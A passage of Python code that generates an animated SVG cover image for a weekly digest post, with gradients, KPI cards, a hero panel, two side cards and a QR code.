        '<radialGradient id="hotRed" cx="50%" cy="50%" r="50%">'
        '<stop offset="0%" stop-color="#E63946" stop-opacity="0.6"/>'
        '<stop offset="100%" stop-color="#E63946" stop-opacity="0"/></radialGradient>'
        '<radialGradient id="hotBlue" cx="50%" cy="50%" r="50%">'
        '<stop offset="0%" stop-color="#3A86FF" stop-opacity="0.5"/>'
        '<stop offset="100%" stop-color="#3A86FF" stop-opacity="0"/></radialGradient>'
        '<radialGradient id="hotAmber" cx="50%" cy="50%" r="50%">'
        '<stop offset="0%" stop-color="#FFB703" stop-opacity="0.45"/>'
        '<stop offset="100%" stop-color="#FFB703" stop-opacity="0"/></radialGradient>'
        '<radialGradient id="hotGreen" cx="50%" cy="50%" r="50%">'
        '<stop offset="0%" stop-color="#4ADE80" stop-opacity="0.45"/>'
        '<stop offset="100%" stop-color="#4ADE80" stop-opacity="0"/></radialGradient>'
        '<radialGradient id="hotPurple" cx="50%" cy="50%" r="50%">'
        '<stop offset="0%" stop-color="#A78BFA" stop-opacity="0.45"/>'
        '<stop offset="100%" stop-color="#A78BFA" stop-opacity="0"/></radialGradient>'
        '<pattern id="envGrid" x="0" y="0" width="40" height="40" patternUnits="userSpaceOnUse">'
        '<circle cx="20" cy="20" r="0.8" fill="#2A3256" opacity="0.55"/></pattern>'
        '<filter id="softShadow" x="-10%" y="-10%" width="130%" height="130%">'
        '<feGaussianBlur in="SourceAlpha" stdDeviation="3"/>'
        '<feOffset dx="2" dy="4"/>'
        '<feComponentTransfer><feFuncA type="linear" slope="0.55"/></feComponentTransfer>'
        '<feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter>'
        '<filter id="textShadow" x="-10%" y="-10%" width="130%" height="130%">'
        '<feGaussianBlur in="SourceAlpha" stdDeviation="1.2"/>'
        '<feOffset dx="1" dy="1.5"/>'
        '<feComponentTransfer><feFuncA type="linear" slope="0.7"/></feComponentTransfer>'
        '<feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge></filter>'
        '</defs>'
    )


def _hero_panel_grad(theme: str) -> str:
    return {
        "red": "heroPanel",
        "blue": "heroPanelBlue",
        "amber": "heroPanelAmber",
        "green": "heroPanelGreen",
        "purple": "heroPanelPurple",
    }.get(theme, "heroPanel")


def _kpi_card(cx: int, cy: int, theme: str, value: str, label: str, sub: str) -> str:
    """KPI card 140x110 centered at (cx,cy)."""
    t = _theme(theme)
    a, soft = t["accent"], t["accent_text"]
    bg = t["kpi_bg"]
    label_col = t["label_color"]
    val = _escape(value)[:6]
    lab = _escape(label)[:10]
    s = _escape(sub)[:18]
    val_fs = 28 if len(val) <= 4 else 22
    return (
        f'<g transform="translate({cx},{cy})" filter="url(#softShadow)">'
        f'<rect x="-68" y="-55" width="140" height="110" rx="10" fill="{bg}" stroke="{a}" stroke-width="2"/>'
        f'<text x="2" y="-28" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="700" letter-spacing="2" fill="{label_col}">{lab}</text>'
        f'<text x="2" y="18" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="{val_fs}" font-weight="900" fill="#F5F7FA">{val}</text>'
        f'<text x="2" y="40" text-anchor="middle" font-family="Inter, Helvetica, Arial, sans-serif" font-size="10" font-weight="600" fill="{soft}">{s}</text>'
        f'</g>'
    )


def _ambient_layer() -> str:
    """Background ambient glows + starfield + side-edge ticks."""
    return (
        '<circle cx="310" cy="310" r="160" fill="url(#hotRed)">'
        '<animate attributeName="opacity" values="0.6;1;0.6" dur="5.8s" repeatCount="indefinite"/></circle>'
        '<circle cx="950" cy="210" r="120" fill="url(#hotBlue)">'
        '<animate attributeName="opacity" values="0.45;0.85;0.45" dur="6.4s" repeatCount="indefinite"/></circle>'
        '<circle cx="970" cy="480" r="110" fill="url(#hotAmber)">'
        '<animate attributeName="opacity" values="0.4;0.75;0.4" dur="7.1s" repeatCount="indefinite"/></circle>'
        '<g fill="#8FB8FF">'
        '<circle cx="180" cy="70" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="3.4s" repeatCount="indefinite"/></circle>'
        '<circle cx="440" cy="62" r="1"><animate attributeName="opacity" values="0.2;0.9;0.2" dur="4.2s" repeatCount="indefinite"/></circle>'
        '<circle cx="740" cy="68" r="1.3"><animate attributeName="opacity" values="0.25;1;0.25" dur="3.9s" repeatCount="indefinite"/></circle>'
        '<circle cx="1060" cy="74" r="0.9"><animate attributeName="opacity" values="0.2;0.85;0.2" dur="5.1s" repeatCount="indefinite"/></circle>'
        '<circle cx="90" cy="580" r="1"><animate attributeName="opacity" values="0.15;0.8;0.15" dur="4.7s" repeatCount="indefinite"/></circle>'
        '<circle cx="550" cy="590" r="0.8"><animate attributeName="opacity" values="0.2;0.75;0.2" dur="3.6s" begin="0.5s" repeatCount="indefinite"/></circle>'
        '</g>'
    )


def _spark_accents() -> str:
    """Small ambient spark accents (right edge + left edge marks)."""
    return (
        '<g opacity="0.85">'
        '<g fill="#F87171">'
        '<circle cx="1104" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle>'
        '<circle cx="1124" cy="110" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.4s" begin="0.3s" repeatCount="indefinite"/></circle>'
        '</g>'
        '<g fill="#7DA3D9">'
        '<circle cx="1104" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="2s" repeatCount="indefinite"/></circle>'
        '<circle cx="1124" cy="218" r="1.2"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.4s" repeatCount="indefinite"/></circle>'
        '</g>'
        '<g fill="#FFD58A">'
        '<circle cx="1104" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.8s" repeatCount="indefinite"/></circle>'
        '<circle cx="1124" cy="374" r="1.4"><animate attributeName="opacity" values="0.2;1;0.2" dur="1.6s" begin="0.3s" repeatCount="indefinite"/></circle>'
        '</g>'
        '<g stroke="#E63946" stroke-width="0.5" fill="none">'
        '<path d="M20 230 L28 230"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2s" repeatCount="indefinite"/></path>'
        '<path d="M20 300 L28 300"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.3s" begin="0.3s" repeatCount="indefinite"/></path>'
        '<path d="M20 370 L28 370"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="1.9s" begin="0.6s" repeatCount="indefinite"/></path>'
        '<path d="M20 440 L28 440"><animate attributeName="stroke-opacity" values="0;0.7;0" dur="2.1s" begin="0.9s" repeatCount="indefinite"/></path>'
        '</g>'
        '</g>'
    )


def render_l20_hero(
    date_str: str,
    hero: Dict,
    top_right: Dict,
    bottom_right: Dict,
    url: str,
    post_title: str,
) -> str:
    """Render full L20 Hero+2-Card 1200x630 SVG.

    Args:
        date_str: e.g. "2026.03.16".
        hero: story dict (theme/visual/headline/sub/kpi/action/...).
        top_right: story dict for HIGH/02.
        bottom_right: story dict for HIGH/03.
        url: post URL for QR code.
        post_title: short post title for ``<title>``.
    """
    # Hero panel
    hero_t = _theme(hero["theme"])
    hero_grad = _hero_panel_grad(hero["theme"])
    hero_accent = hero_t["accent"]
    hero_text = hero_t["accent_text"]

    tr_t = _theme(top_right["theme"])
    tr_grad = _hero_panel_grad(top_right["theme"])
    tr_accent = tr_t["accent"]

    br_t = _theme(bottom_right["theme"])
    br_grad = _hero_panel_grad(bottom_right["theme"])
    br_accent = br_t["accent"]

    aria = _escape(
        f"Weekly digest cover {date_str}: "
        f"{hero['headline']}, {top_right['headline']}, {bottom_right['headline']}"
    )
    title = _escape(post_title)

    parts = []
    parts.append(
        f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1200 630" '
        f'width="1200" height="630" role="img" aria-label="{aria}">'
    )
    parts.append('<!-- profile: high-quality-cover (L20 Hero+2-Card) -->')
    parts.append(f'<title>{title}</title>')
    parts.append(_defs())
    # Background
    parts.append('<rect width="1200" height="630" fill="url(#bgSpread)"/>')
    parts.append('<rect width="1200" height="630" fill="url(#envGrid)"/>')
    parts.append(_ambient_layer())
    # Header bar
    parts.append('<rect x="0" y="0" width="1200" height="56" fill="#050813" opacity="0.92"/>')
    parts.append(
        '<text x="36" y="36" font-family="Inter, Helvetica, Arial, sans-serif" '
        'font-size="18" font-weight="700" fill="#8FB8FF" letter-spacing="2.5">WEEKLY DIGEST</text>'
    )
    parts.append(
        f'<text x="1164" y="36" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="15" font-weight="600" fill="#7DA3D9" letter-spacing="1.5" text-anchor="end">{_escape(date_str)}</text>'
    )
    parts.append(
        '<rect x="0" y="54" width="1200" height="2" fill="#E63946" opacity="0.85">'
        '<animate attributeName="opacity" values="0.4;1;0.4" dur="4.8s" repeatCount="indefinite"/></rect>'
    )

    # HERO LEFT panel
    parts.append(
        f'<rect x="32" y="80" width="600" height="510" rx="14" ry="14" '
        f'fill="url(#{hero_grad})" stroke="{hero_accent}" stroke-width="1.8" opacity="0.98"/>'
    )
    parts.append(
        f'<rect x="32" y="80" width="600" height="4" fill="{hero_accent}" opacity="0.85">'
        f'<animate attributeName="opacity" values="0.5;1;0.5" dur="3.4s" repeatCount="indefinite"/></rect>'
    )
    parts.append('<g filter="url(#textShadow)">')
    parts.append(
        f'<text x="54" y="112" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="13" font-weight="700" fill="{hero_t["accent_soft"]}" letter-spacing="3">'
        f'{_escape(hero["tag"])}  /  {_escape(hero["index"])}</text>'
    )
    parts.append(
        f'<text x="54" y="146" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="31" font-weight="800" fill="#F8FAFC">{_escape(hero["headline"])}</text>'
    )
    parts.append(
        f'<text x="54" y="174" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="17" font-weight="500" fill="{hero_text}">{_escape(hero["subheadline"])}</text>'
    )
    parts.append('</g>')
    # Hero embedded visual (centered around (332, 360))
    parts.append(_render_visual(hero["visual"], 332, 360, hero["theme"], hero.get("kpi_label", "")))
    # Hero action tag
    parts.append('<g transform="translate(54,548)">')
    parts.append(f'<rect x="0" y="0" width="280" height="24" rx="3" fill="{hero_accent}" opacity="0.95"/>')
    parts.append(
        f'<text x="140" y="17" text-anchor="middle" '
        f'font-family="Inter, Helvetica, Arial, sans-serif" font-size="12" font-weight="700" '
        f'fill="#FFFFFF">{_escape(hero["action"])}</text>'
    )
    parts.append('</g>')
    parts.append(
        f'<text x="350" y="566" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="13" font-weight="600" fill="#A5B4C4" font-style="italic">Weekly Digest  /  {_escape(date_str)}</text>'
    )

    # TOP RIGHT panel
    parts.append(
        f'<rect x="652" y="80" width="516" height="248" rx="14" ry="14" '
        f'fill="url(#{tr_grad})" stroke="{tr_accent}" stroke-width="1.6" opacity="0.97"/>'
    )
    parts.append(
        f'<rect x="652" y="80" width="516" height="4" fill="{tr_accent}" opacity="0.85">'
        f'<animate attributeName="opacity" values="0.5;1;0.5" dur="4.2s" repeatCount="indefinite"/></rect>'
    )
    parts.append('<g filter="url(#textShadow)">')
    parts.append(
        f'<text x="670" y="110" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="12" font-weight="700" fill="{tr_t["label_color"]}" letter-spacing="3">'
        f'{_escape(top_right["tag"])}  /  {_escape(top_right["index"])}</text>'
    )
    parts.append(
        f'<text x="670" y="140" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="24" font-weight="800" fill="#F5F7FA">{_escape(top_right["headline"])}</text>'
    )
    parts.append(
        f'<text x="670" y="163" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="14" font-weight="500" fill="{tr_t["accent_text"]}">{_escape(top_right["subheadline"])}</text>'
    )
    parts.append('</g>')
    parts.append(_render_visual(top_right["visual"], 800, 230, top_right["theme"], top_right.get("kpi_label", "")))
    parts.append(_kpi_card(1094, 168, top_right["theme"], top_right["kpi_value"], top_right["kpi_label"], top_right["kpi_sub"]))

    # BOTTOM RIGHT panel
    parts.append(
        f'<rect x="652" y="344" width="516" height="246" rx="14" ry="14" '
        f'fill="url(#{br_grad})" stroke="{br_accent}" stroke-width="1.6" opacity="0.97"/>'
    )
    parts.append(
        f'<rect x="652" y="344" width="516" height="4" fill="{br_accent}" opacity="0.85">'
        f'<animate attributeName="opacity" values="0.5;1;0.5" dur="4.8s" repeatCount="indefinite"/></rect>'
    )
    parts.append('<g filter="url(#textShadow)">')
    parts.append(
        f'<text x="670" y="374" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="12" font-weight="700" fill="{br_t["label_color"]}" letter-spacing="3">'
        f'{_escape(bottom_right["tag"])}  /  {_escape(bottom_right["index"])}</text>'
    )
    parts.append(
        f'<text x="670" y="404" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="24" font-weight="800" fill="#F5F7FA">{_escape(bottom_right["headline"])}</text>'
    )
    parts.append(
        f'<text x="670" y="428" font-family="Inter, Helvetica, Arial, sans-serif" '
        f'font-size="14" font-weight="500" fill="{br_t["accent_text"]}">{_escape(bottom_right["subheadline"])}</text>'
    )
    parts.append('</g>')
    parts.append(_render_visual(bottom_right["visual"], 800, 490, bottom_right["theme"], bottom_right.get("kpi_label", "")))
    parts.append(_kpi_card(1094, 452, bottom_right["theme"], bottom_right["kpi_value"], bottom_right["kpi_label"], bottom_right["kpi_sub"]))

    parts.append(_spark_accents())
    # QR (real)
    parts.append(l22.qr_block(url))
    parts.append('</svg>')
    return "\n".join(parts) + "\n"

